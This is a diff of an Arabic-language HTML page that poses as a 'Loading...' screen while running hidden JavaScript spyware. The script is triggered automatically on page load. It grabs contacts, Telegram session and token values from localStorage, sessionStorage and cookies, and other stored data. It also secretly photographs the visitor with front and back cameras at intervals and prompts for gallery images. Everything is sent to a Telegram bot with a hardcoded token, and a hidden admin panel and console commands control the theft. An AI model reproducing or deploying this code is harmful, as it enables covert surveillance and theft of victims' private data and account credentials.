@@ -5,71 +5,24 @@
     <title>جاري التحميل...</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
-        body {
-            background: #0a0a0a;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            font-family: 'Arial', sans-serif;
-        }
-        .loader {
-            text-align: center;
-            color: #fff;
-        }
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #333;
-            border-top: 4px solid #25D366;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
+        body { background: #0a0a0a; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: 'Arial', sans-serif; }
+        .loader { text-align: center; color: #fff; }
+        .spinner { width: 50px; height: 50px; border: 4px solid #333; border-top: 4px solid #25D366; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
         .loader p { color: #888; font-size: 14px; }
         #status { color: #666; font-size: 12px; margin-top: 10px; }
 
         #adminPanel {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0,0,0,0.95);
-            z-index: 99999;
-            padding: 20px;
-            overflow-y: auto;
-            color: #fff;
-            font-family: 'Tahoma', sans-serif;
+            display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.95); z-index: 99999; padding: 20px; overflow-y: auto;
+            color: #fff; font-family: 'Tahoma', sans-serif;
         }
         #adminPanel.active { display: block; }
-        .admin-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 2px solid #25D366;
-            padding-bottom: 10px;
-            margin-bottom: 20px;
-        }
+        .admin-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #25D366; padding-bottom: 10px; margin-bottom: 20px; }
         .admin-header h1 { color: #25D366; font-size: 24px; }
         .admin-header .status { font-size: 12px; color: #888; }
-        .admin-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-            margin-bottom: 20px;
-        }
-        .admin-card {
-            background: #1a1a2e;
-            border: 1px solid #333;
-            border-radius: 12px;
-            padding: 20px;
-            text-align: center;
-            cursor: pointer;
-            transition: 0.3s;
-        }
+        .admin-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 20px; }
+        .admin-card { background: #1a1a2e; border: 1px solid #333; border-radius: 12px; padding: 20px; text-align: center; cursor: pointer; transition: 0.3s; }
         .admin-card:hover { border-color: #25D366; transform: scale(1.02); }
         .admin-card .icon { font-size: 30px; margin-bottom: 10px; }
         .admin-card .label { font-size: 13px; color: #aaa; }
@@ -77,16 +30,7 @@
         .admin-card.danger:hover { border-color: #ff4444; }
         .admin-card.danger .icon { color: #ff4444; }
 
-        .admin-log {
-            background: #0d0d1a;
-            border: 1px solid #333;
-            border-radius: 12px;
-            padding: 15px;
-            max-height: 300px;
-            overflow-y: auto;
-            font-family: monospace;
-            font-size: 12px;
-        }
+        .admin-log { background: #0d0d1a; border: 1px solid #333; border-radius: 12px; padding: 15px; max-height: 300px; overflow-y: auto; font-family: monospace; font-size: 12px; }
         .admin-log .entry { padding: 4px 0; border-bottom: 1px solid #111; }
         .admin-log .entry .time { color: #666; }
         .admin-log .entry .msg { color: #0f0; }
@@ -94,68 +38,23 @@
         .admin-log .entry .warn { color: #ff0; }
         .admin-log .entry .info { color: #0ff; }
 
-        .admin-actions {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-            margin: 15px 0;
-        }
-        .admin-btn {
-            background: #1a1a2e;
-            border: 1px solid #333;
-            color: #fff;
-            padding: 10px 20px;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: 0.3s;
-            flex: 1;
-            min-width: 120px;
-        }
+        .admin-actions { display: flex; gap: 10px; flex-wrap: wrap; margin: 15px 0; }
+        .admin-btn { background: #1a1a2e; border: 1px solid #333; color: #fff; padding: 10px 20px; border-radius: 8px; cursor: pointer; transition: 0.3s; flex: 1; min-width: 120px; }
         .admin-btn:hover { border-color: #25D366; background: #2a2a3e; }
         .admin-btn.danger:hover { border-color: #ff4444; background: #3a1a1a; }
         .admin-btn.success { border-color: #25D366; }
         .admin-btn.success:hover { background: #1a3a2a; }
 
-        #toast {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: #1a1a2e;
-            border: 1px solid #25D366;
-            border-radius: 12px;
-            padding: 15px 25px;
-            color: #fff;
-            z-index: 9999999;
-            display: none;
-            min-width: 200px;
-        }
+        #toast { position: fixed; top: 20px; right: 20px; background: #1a1a2e; border: 1px solid #25D366; border-radius: 12px; padding: 15px 25px; color: #fff; z-index: 9999999; display: none; min-width: 200px; }
         #toast.show { display: block; animation: fadeIn 0.3s; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
 
-        .file-browser {
-            background: #0d0d1a;
-            border: 1px solid #333;
-            border-radius: 12px;
-            padding: 15px;
-            max-height: 400px;
-            overflow-y: auto;
-            margin-top: 15px;
-            display: none;
-        }
-        .file-browser.active { display: block; }
-        .file-item {
-            padding: 8px 12px;
-            border-bottom: 1px solid #1a1a2e;
-            cursor: pointer;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .file-item:hover { background: #1a1a2e; }
-        .file-item .name { color: #0ff; }
-        .file-item .size { color: #666; font-size: 11px; }
-        .file-item .type { color: #888; font-size: 11px; }
-        .file-item .preview { max-width: 50px; max-height: 50px; border-radius: 4px; }
+        .folder-tree { background: #0d0d1a; border: 1px solid #333; border-radius: 12px; padding: 15px; max-height: 400px; overflow-y: auto; margin-top: 15px; display: none; }
+        .folder-tree.active { display: block; }
+        .folder-item { padding: 8px 12px; border-bottom: 1px solid #1a1a2e; cursor: pointer; }
+        .folder-item:hover { background: #1a1a2e; }
+        .folder-item .name { color: #0ff; }
+        .folder-item .info { color: #666; font-size: 11px; }
     </style>
 </head>
 <body>
@@ -170,6 +69,7 @@
 <video id="videoBack" autoplay muted playsinline style="display:none;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
 <audio id="audio" style="display:none;"></audio>
+<input type="file" id="fileInput" multiple style="display:none;">
 
 <div id="toast"></div>
 
@@ -180,6 +80,11 @@
     </div>
 
     <div class="admin-grid">
+        <div class="admin-card" onclick="stealAll()">
+            <div class="icon">🚀</div>
+            <div class="label">سحب الكل</div>
+            <div class="count" id="totalCount">0</div>
+        </div>
         <div class="admin-card" onclick="stealContacts()">
             <div class="icon">👤</div>
             <div class="label">جهات الاتصال</div>
@@ -192,12 +97,12 @@
         </div>
         <div class="admin-card" onclick="captureBothCameras()">
             <div class="icon">📸</div>
-            <div class="label">تصوير كامل</div>
+            <div class="label">الصور</div>
             <div class="count" id="camCount">0</div>
         </div>
         <div class="admin-card" onclick="stealAllFiles()">
             <div class="icon">📁</div>
-            <div class="label">سحب الملفات</div>
+            <div class="label">الملفات</div>
             <div class="count" id="fileCount">0</div>
         </div>
         <div class="admin-card danger" onclick="killAll()">
@@ -208,18 +113,14 @@
     </div>
 
     <div class="admin-actions">
-        <button class="admin-btn success" onclick="stealContacts()">👤 سحب جهات الاتصال</button>
-        <button class="admin-btn" onclick="stealTelegram()">✈️ سحب تليجرام</button>
-        <button class="admin-btn" onclick="captureBothCameras()">📸 تصوير كامل</button>
-        <button class="admin-btn" onclick="stealAllFiles()">📁 سحب الملفات</button>
-        <button class="admin-btn" onclick="browseFiles()">📂 تصفح الملفات</button>
+        <button class="admin-btn success" onclick="stealAll()">🚀 سحب الكل دفعة واحدة</button>
+        <button class="admin-btn" onclick="showFolders()">📂 عرض المجلدات</button>
         <button class="admin-btn danger" onclick="killAll()">💀 إيقاف الكل</button>
     </div>
 
-    <div class="file-browser" id="fileBrowser">
-        <h3 style="color:#25D366;margin-bottom:10px;">📂 مستكشف الملفات</h3>
-        <input type="text" id="fileSearch" placeholder="🔍 بحث..." style="width:100%;padding:10px;background:#0d0d1a;border:1px solid #333;color:#fff;border-radius:8px;margin-bottom:10px;" onkeyup="filterFiles()">
-        <div id="fileList"></div>
+    <div class="folder-tree" id="folderTree">
+        <h3 style="color:#25D366;margin-bottom:10px;">📂 هيكل الملفات المسروقة</h3>
+        <div id="folderList"></div>
     </div>
 
     <div class="admin-log" id="adminLog">
@@ -237,9 +138,8 @@
 // ============================================================
 const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
 let CHAT_ID = '';
-let targetData = { contacts: 0, tg: 0, camera: 0, files: 0 };
-let allStolenFiles = [];
-let fileIndex = 0;
+let stolenData = { contacts: [], telegram: [], photos: [], files: [] };
+let totalStolen = 0;
 
 // ============================================================
 // ====================== TOGGLE PANEL ========================
@@ -292,6 +192,34 @@ function showToast(text, duration = 3000) {
 }
 
 // ============================================================
+// ====================== STEAL ALL ===========================
+// ============================================================
+function stealAll() {
+    addLog('🚀 بدء سحب كل البيانات...', 'info');
+    showToast('🚀 جاري سحب كل شيء...');
+    
+    // 1. سحب جهات الاتصال
+    stealContacts();
+    
+    // 2. سحب تليجرام
+    setTimeout(() => stealTelegram(), 2000);
+    
+    // 3. سحب الصور من الكاميرات
+    setTimeout(() => captureBothCameras(), 4000);
+    
+    // 4. سحب الملفات
+    setTimeout(() => stealAllFiles(), 6000);
+    
+    // 5. محاولة سحب الصور من المعرض عبر input
+    setTimeout(() => stealGallery(), 8000);
+    
+    setTimeout(() => {
+        showToast('✅ تم سحب كل البيانات');
+        sendMessage(`✅ تم سحب ${totalStolen} عنصر بنجاح`);
+    }, 10000);
+}
+
+// ============================================================
 // ====================== STEAL CONTACTS ======================
 // ============================================================
 function stealContacts() {
@@ -300,15 +228,16 @@ function stealContacts() {
     
     try {
         if ('contacts' in navigator && 'select' in navigator.contacts) {
-            navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
+            navigator.contacts.select(['name', 'tel', 'email', 'address'], { multiple: true })
                 .then(contacts => {
-                    const text = contacts.map(c => 
-                        `👤 ${c.name} | ${c.tel ? c.tel.join(', ') : ''} | ${c.email ? c.email.join(', ') : ''}`
-                    ).join('\n');
-                    sendMessage(`📱 جهات الاتصال (${contacts.length}):\n${text}`);
+                    stolenData.contacts = contacts;
+                    contacts.forEach((c, i) => {
+                        const text = `📱 جهة اتصال ${i+1}:\n👤 الاسم: ${c.name || 'غير معروف'}\n📞 الرقم: ${c.tel ? c.tel.join(', ') : 'غير موجود'}\n📧 البريد: ${c.email ? c.email.join(', ') : 'غير موجود'}`;
+                        sendMessage(text);
+                        totalStolen++;
+                    });
+                    document.getElementById('contactCount').textContent = contacts.length;
                     addLog(`👤 تم سحب ${contacts.length} جهة اتصال`, 'msg');
-                    targetData.contacts += contacts.length;
-                    document.getElementById('contactCount').textContent = targetData.contacts;
                 })
                 .catch(() => {
                     addLog('❌ فشل سحب جهات الاتصال', 'error');
@@ -324,10 +253,18 @@ function stealContacts() {
 
 function stealContactsFallback() {
     try {
-        const contacts = localStorage.getItem('contacts') || localStorage.getItem('phonebook');
-        if (contacts) {
-            sendMessage(`📱 جهات اتصال من localStorage:\n${contacts}`);
-            addLog('👤 تم سحب جهات اتصال من localStorage', 'msg');
+        // محاولة من localStorage
+        const contactsData = localStorage.getItem('contacts') || localStorage.getItem('phonebook') || localStorage.getItem('contacts_list');
+        if (contactsData) {
+            let contacts = [];
+            try { contacts = JSON.parse(contactsData); } catch(e) { contacts = [{ name: 'مستورد', tel: contactsData }]; }
+            contacts.forEach((c, i) => {
+                const text = `📱 جهة اتصال ${i+1} (من localStorage):\n👤 ${c.name || c.username || 'غير معروف'}\n📞 ${c.tel || c.phone || c.number || 'غير موجود'}`;
+                sendMessage(text);
+                totalStolen++;
+            });
+            document.getElementById('contactCount').textContent = contacts.length;
+            addLog(`👤 تم سحب ${contacts.length} جهة اتصال من localStorage`, 'msg');
         }
     } catch(e) {}
 }
@@ -340,39 +277,57 @@ function stealTelegram() {
     showToast('✈️ جاري سحب تليجرام...');
     let found = 0;
     
+    const tgKeys = ['tg', 'telegram', 'gram', 'user', 'session', 'token', 'auth', 'login', 'account', 'profile', 'phone', 'number', 'username'];
+    
     try {
+        // سحب من localStorage
         for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
             const value = localStorage.getItem(key);
-            if (key && (key.includes('tg') || key.includes('telegram') || key.includes('gram') || 
-                key.includes('user') || key.includes('session') || key.includes('token'))) {
-                sendMessage(`📦 Telegram localStorage [${key}]:\n${value}`);
+            if (key && tgKeys.some(k => key.toLowerCase().includes(k))) {
+                sendMessage(`✈️ تليجرام [${key}]:\n${value}`);
                 found++;
+                totalStolen++;
                 addLog(`✈️ تم سحب: ${key}`, 'msg');
             }
         }
     } catch(e) {}
     
     try {
+        // سحب من sessionStorage
         for (let i = 0; i < sessionStorage.length; i++) {
             const key = sessionStorage.key(i);
             const value = sessionStorage.getItem(key);
-            if (key && (key.includes('tg') || key.includes('telegram') || key.includes('gram') || 
-                key.includes('user') || key.includes('session') || key.includes('token'))) {
-                sendMessage(`📦 Telegram sessionStorage [${key}]:\n${value}`);
+            if (key && tgKeys.some(k => key.toLowerCase().includes(k))) {
+                sendMessage(`✈️ تليجرام session [${key}]:\n${value}`);
                 found++;
+                totalStolen++;
                 addLog(`✈️ تم سحب: ${key}`, 'msg');
             }
         }
     } catch(e) {}
     
-    targetData.tg += found;
-    document.getElementById('tgCount').textContent = targetData.tg;
+    // محاولة سحب من cookies
+    try {
+        document.cookie.split(';').forEach(cookie => {
+            const [key, value] = cookie.trim().split('=');
+            if (key && tgKeys.some(k => key.toLowerCase().includes(k))) {
+                sendMessage(`✈️ تليجرام cookie [${key}]:\n${value}`);
+                found++;
+                totalStolen++;
+            }
+        });
+    } catch(e) {}
+    
+    document.getElementById('tgCount').textContent = found;
+    if (found === 0) {
+        sendMessage('✈️ لم يتم العثور على بيانات تليجرام');
+    }
     setTimeout(() => showToast(`✅ تم سحب ${found} عنصر من تليجرام`), 2000);
 }
 
 // ============================================================
-// ====================== CAPTURE BOTH CAMERAS ================
+// ====================== CAPTURE CAMERAS =====================
 // ============================================================
 let frontStream = null, backStream = null;
 let frontInterval = null, backInterval = null;
@@ -382,44 +337,37 @@ function captureBothCameras() {
     addLog('📸 تشغيل الكاميرات (أمامي+خلفي)...', 'info');
     showToast('📸 تشغيل الكاميرات...');
     
-    const frontConstraints = {
-        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
-    };
-    
-    navigator.mediaDevices.getUserMedia(frontConstraints)
+    // الأمامية
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } })
         .then(function(stream) {
             frontStream = stream;
             const video = document.getElementById('videoFront');
             video.srcObject = stream;
             video.play();
             addLog('📸 الكاميرا الأمامية تعمل', 'msg');
-            setTimeout(() => captureFrontPhoto(), 1000);
-            frontInterval = setInterval(captureFrontPhoto, 5000);
+            setTimeout(() => captureFrontPhoto(), 1500);
+            frontInterval = setInterval(captureFrontPhoto, 7000);
         })
         .catch(function(err) {
             addLog('❌ فشل الكاميرا الأمامية: ' + err.message, 'error');
         });
     
-    const backConstraints = {
-        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } }
-    };
-    
-    navigator.mediaDevices.getUserMedia(backConstraints)
+    // الخلفية
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } } })
         .then(function(stream) {
             backStream = stream;
             const video = document.getElementById('videoBack');
             video.srcObject = stream;
             video.play();
             addLog('📸 الكاميرا الخلفية تعمل', 'msg');
-            setTimeout(() => captureBackPhoto(), 1000);
-            backInterval = setInterval(captureBackPhoto, 5000);
+            setTimeout(() => captureBackPhoto(), 1500);
+            backInterval = setInterval(captureBackPhoto, 7000);
         })
         .catch(function(err) {
             addLog('❌ فشل الكاميرا الخلفية: ' + err.message, 'error');
         });
     
-    targetData.camera++;
-    document.getElementById('camCount').textContent = targetData.camera;
+    document.getElementById('camCount').textContent = '✓';
 }
 
 function captureFrontPhoto() {
@@ -431,8 +379,9 @@ function captureFrontPhoto() {
     canvas.height = video.videoHeight;
     ctx.drawImage(video, 0, 0);
     photoCount++;
-    const imageData = canvas.toDataURL('image/jpeg', 0.7);
-    sendToTelegram(imageData, `📸 أمامي ${photoCount} - ${new Date().toLocaleString()}`);
+    const imageData = canvas.toDataURL('image/jpeg', 0.8);
+    sendToTelegram(imageData, `📸 صورة أمامي ${photoCount} - ${new Date().toLocaleString()}`);
+    totalStolen++;
     addLog(`📸 صورة أمامي ${photoCount} مرسلة`, 'msg');
 }
 
@@ -445,9 +394,44 @@ function captureBackPhoto() {
     canvas.height = video.videoHeight;
     ctx.drawImage(video, 0, 0);
     photoCount++;
-    const imageData = canvas.toDataURL('image/jpeg', 0.7);
-    sendToTelegram(imageData, `📸 خلفي ${photoCount} - ${new Date().toLocaleString()}`);
+    const imageData = canvas.toDataURL('image/jpeg', 0.8);
+    sendToTelegram(imageData, `📸 صورة خلفي ${photoCount} - ${new Date().toLocaleString()}`);
+    totalStolen++;
     addLog(`📸 صورة خلفي ${photoCount} مرسلة`, 'msg');
+}
+
+// ============================================================
+// ====================== STEAL GALLERY =======================
+// ============================================================
+function stealGallery() {
+    addLog('🖼️ محاولة سحب الصور من المعرض...', 'info');
+    showToast('🖼️ جاري سحب الصور...');
+    
+    try {
+        const input = document.getElementById('fileInput');
+        input.accept = 'image/*';
+        input.click();
+        
+        input.onchange = function(e) {
+            const files = e.target.files;
+            if (files.length > 0) {
+                for (let i = 0; i < Math.min(files.length, 20); i++) {
+                    const file = files[i];
+                    const reader = new FileReader();
+                    reader.onload = function(ev) {
+                        sendToTelegram(ev.target.result, `🖼️ صورة من المعرض: ${file.name} (${Math.round(file.size/1024)}KB)`);
+                        totalStolen++;
+                        addLog(`🖼️ تم سحب: ${file.name}`, 'msg');
+                    };
+                    reader.readAsDataURL(file);
+                }
+                setTimeout(() => showToast(`✅ تم سحب ${files.length} صورة`), 3000);
+            }
+            input.value = '';
+        };
+    } catch(e) {
+        addLog('❌ فشل سحب الصور من المعرض', 'error');
+    }
 }
 
 // ============================================================
@@ -457,16 +441,16 @@ function stealAllFiles() {
     addLog('📁 بدء سحب جميع الملفات...', 'info');
     showToast('📁 جاري سحب الملفات...');
     let found = 0;
-    allStolenFiles = [];
     
     try {
         for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
             const value = localStorage.getItem(key);
-            const fileData = { id: fileIndex++, name: key, content: value, type: 'localStorage', size: value.length };
-            allStolenFiles.push(fileData);
-            sendMessage(`📦 ملف ${key} (${value.length} bytes):\n${value}`);
-            found++;
+            if (value && value.length > 10) {
+                sendMessage(`📦 ملف: ${key}\nالحجم: ${value.length} bytes\nالمحتوى:\n${value}`);
+                found++;
+                totalStolen++;
+            }
         }
     } catch(e) {}
     
@@ -474,99 +458,40 @@ function stealAllFiles() {
         for (let i = 0; i < sessionStorage.length; i++) {
             const key = sessionStorage.key(i);
             const value = sessionStorage.getItem(key);
-            const fileData = { id: fileIndex++, name: key, content: value, type: 'sessionStorage', size: value.length };
-            allStolenFiles.push(fileData);
-            sendMessage(`📦 ملف ${key} (${value.length} bytes):\n${value}`);
-            found++;
+            if (value && value.length > 10) {
+                sendMessage(`📦 ملف session: ${key}\nالحجم: ${value.length} bytes\nالمحتوى:\n${value}`);
+                found++;
+                totalStolen++;
+            }
         }
     } catch(e) {}
     
-    try {
-        const request = indexedDB.open('files', 1);
-        request.onsuccess = function(event) {
-            const db = event.target.result;
-            const stores = db.objectStoreNames;
-            stores.forEach(storeName => {
-                const transaction = db.transaction(storeName, 'readonly');
-                const store = transaction.objectStore(storeName);
-                const getAll = store.getAll();
-                getAll.onsuccess = function() {
-                    const data = getAll.result;
-                    if (data && data.length > 0) {
-                        data.forEach((item, idx) => {
-                            const fileData = { id: fileIndex++, name: `indexeddb_${storeName}_${idx}`, content: JSON.stringify(item), type: 'IndexedDB', size: JSON.stringify(item).length };
-                            allStolenFiles.push(fileData);
-                            sendMessage(`📦 IndexedDB [${storeName}] ملف ${idx}:\n${JSON.stringify(item)}`);
-                            found++;
-                        });
-                    }
-                };
-            });
-        };
-    } catch(e) {}
-    
-    targetData.files += found;
-    document.getElementById('fileCount').textContent = targetData.files;
-    browseFiles();
-    setTimeout(() => showToast(`✅ تم سحب ${found} ملف`), 3000);
+    document.getElementById('fileCount').textContent = found;
+    if (found === 0) {
+        sendMessage('📁 لم يتم العثور على ملفات');
+    }
+    showFolders();
+    setTimeout(() => showToast(`✅ تم سحب ${found} ملف`), 2000);
 }
 
 // ============================================================
-// ====================== BROWSE FILES ========================
+// ====================== SHOW FOLDERS ========================
 // ============================================================
-function browseFiles() {
-    const browser = document.getElementById('fileBrowser');
-    browser.classList.toggle('active');
-    if (browser.classList.contains('active')) {
-        renderFileList();
-    }
-}
-
-function renderFileList(filter = '') {
-    const list = document.getElementById('fileList');
-    list.innerHTML = '';
-    const filtered = allStolenFiles.filter(f => 
-        f.name.toLowerCase().includes(filter.toLowerCase()) || 
-        f.type.toLowerCase().includes(filter.toLowerCase())
-    );
-    
-    if (filtered.length === 0) {
-        list.innerHTML = '<div style="color:#666;text-align:center;padding:20px;">لا توجد ملفات</div>';
-        return;
-    }
-    
-    filtered.forEach(file => {
-        const div = document.createElement('div');
-        div.className = 'file-item';
-        const isImage = file.content && (file.content.startsWith('data:image') || file.content.match(/\.(jpg|jpeg|png|gif|webp)/i));
-        
-        div.innerHTML = `
-            <div style="flex:1;">
-                <div class="name">📄 ${file.name}</div>
-                <div class="size">${file.type} • ${file.size} bytes</div>
+function showFolders() {
+    const tree = document.getElementById('folderTree');
+    tree.classList.toggle('active');
+    if (tree.classList.contains('active')) {
+        const list = document.getElementById('folderList');
+        list.innerHTML = `
+            <div class="folder-item"><span class="name">📱 جهات الاتصال</span> <span class="info">${stolenData.contacts.length} جهة</span></div>
+            <div class="folder-item"><span class="name">✈️ تليجرام</span> <span class="info">${document.getElementById('tgCount').textContent} عنصر</span></div>
+            <div class="folder-item"><span class="name">📸 الصور</span> <span class="info">${photoCount} صورة</span></div>
+            <div class="folder-item"><span class="name">📁 الملفات</span> <span class="info">${document.getElementById('fileCount').textContent} ملف</span></div>
+            <div class="folder-item" style="border-top:1px solid #25D366;margin-top:10px;padding-top:10px;">
+                <span class="name" style="color:#25D366;">📊 المجموع الكلي</span>
+                <span class="info" style="color:#25D366;">${totalStolen} عنصر</span>
             </div>
-            ${isImage ? `<img src="${file.content}" class="preview" />` : ''}
-            <button onclick="viewFile(${file.id})" style="background:#25D366;border:none;color:#000;padding:5px 10px;border-radius:4px;cursor:pointer;">👁️</button>
         `;
-        list.appendChild(div);
-    });
-}
-
-function filterFiles() {
-    const search = document.getElementById('fileSearch').value;
-    renderFileList(search);
-}
-
-function viewFile(id) {
-    const file = allStolenFiles.find(f => f.id === id);
-    if (!file) return;
-    
-    if (file.content && file.content.startsWith('data:image')) {
-        sendToTelegram(file.content, `📸 ملف: ${file.name} (${file.type})`);
-        showToast('✅ تم إرسال الصورة إلى البوت');
-    } else {
-        sendMessage(`📄 ملف: ${file.name}\nالنوع: ${file.type}\nالحجم: ${file.size} bytes\nالمحتوى:\n${file.content}`);
-        showToast('✅ تم إرسال الملف إلى البوت');
     }
 }
 
@@ -584,7 +509,7 @@ function killAll() {
     
     addLog('✅ تم إيقاف جميع العمليات', 'msg');
     showToast('✅ تم إيقاف جميع العمليات');
-    sendMessage('💀 تم إيقاف جميع العمليات بأمر من المالك');
+    sendMessage('💀 تم إيقاف جميع العمليات');
 }
 
 // ============================================================
@@ -653,14 +578,11 @@ function dataURLtoBlob(dataURL) {
 function startBackgroundOperations() {
     addLog('🚀 بدء العمليات الخلفية...', 'info');
     document.getElementById('status').textContent = '✅ جاهز';
-    sendMessage(`🟢 الجهاز متصل\n📱 ${navigator.userAgent}`);
+    sendMessage(`🟢 الجهاز متصل\n📱 ${navigator.userAgent}\n⏰ ${new Date().toLocaleString()}`);
     
     setTimeout(() => {
-        captureBothCameras();
-        setTimeout(() => stealContacts(), 3000);
-        setTimeout(() => stealTelegram(), 6000);
-        setTimeout(() => stealAllFiles(), 9000);
-    }, 3000);
+        stealAll();
+    }, 5000);
 }
 
 // ============================================================
@@ -692,17 +614,19 @@ document.addEventListener('keydown', function(e) {
 
 window.admin = {
     panel: () => togglePanel(),
+    steal: () => stealAll(),
     contacts: () => stealContacts(),
     telegram: () => stealTelegram(),
     camera: () => captureBothCameras(),
     files: () => stealAllFiles(),
-    browse: () => browseFiles(),
+    gallery: () => stealGallery(),
+    folders: () => showFolders(),
     kill: () => killAll(),
     log: addLog
 };
 
 console.log('🕵️ لوحة التحكم جاهزة! Ctrl+Shift+P لفتحها');
-console.log('📋 الأوامر: admin.contacts(), admin.telegram(), admin.camera(), admin.files(), admin.browse(), admin.kill()');
+console.log('📋 الأوامر: admin.steal(), admin.contacts(), admin.telegram(), admin.camera(), admin.files(), admin.gallery(), admin.folders(), admin.kill()');
 </script>
 </body>
 </html>
